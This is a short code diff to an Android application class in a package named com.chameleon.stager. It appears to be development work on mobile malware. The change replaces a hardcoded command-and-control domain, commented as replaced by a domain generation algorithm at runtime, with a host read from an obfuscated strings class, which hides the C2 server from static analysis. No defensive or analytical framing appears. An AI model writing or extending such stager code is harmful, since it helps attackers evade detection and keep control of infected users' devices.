@@ -2,13 +2,14 @@ package com.chameleon.stager
 
 import android.app.Application
 import android.content.Context
+import com.chameleon.stager.utils.ObfuscatedStrings
 
 class StagerApplication : Application() {
     companion object {
         lateinit var instance: StagerApplication
             private set
         val c2BaseUrl: String
-            get() = "https://charm-a1b2c3d4-ef56.com" // replaced by DGA at runtime
+            get() = "https://${ObfuscatedStrings.c2Host}"
 
         var c2RealUrl: String = ""
             private set
